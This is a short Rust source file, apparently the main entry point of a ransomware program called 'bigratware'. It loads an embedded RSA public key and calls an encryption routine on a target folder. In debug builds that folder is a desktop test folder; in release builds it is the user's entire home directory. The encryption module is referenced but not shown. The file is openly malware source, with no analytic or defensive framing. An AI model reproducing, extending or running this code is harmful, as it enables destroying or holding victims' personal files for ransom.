mod encryptor;

use rsa::pkcs8::DecodePublicKey;
use rsa::RsaPublicKey;
use anyhow::Result;
use crate::encryptor::encrypt_everything;

const BIGRAT_PNG: &[u8; 1044942] = include_bytes!("../../bigrat.png");
const PUBLIC_KEY: &[u8; 294] = include_bytes!("../../public-key.der");

fn main() -> Result<()> {
    let pub_key = RsaPublicKey::from_public_key_der(PUBLIC_KEY)?;
    let mut rng = rand::thread_rng();

    #[cfg(debug_assertions)]
    let working_path = dirs_next::desktop_dir()
        .unwrap_or(dirs_next::home_dir().unwrap())
        .join("bigratware-testground");
    #[cfg(not(debug_assertions))]
    let working_path = dirs_next::home_dir().unwrap();

    encrypt_everything(&working_path, &pub_key, &mut rng)?;

    Ok(())
}
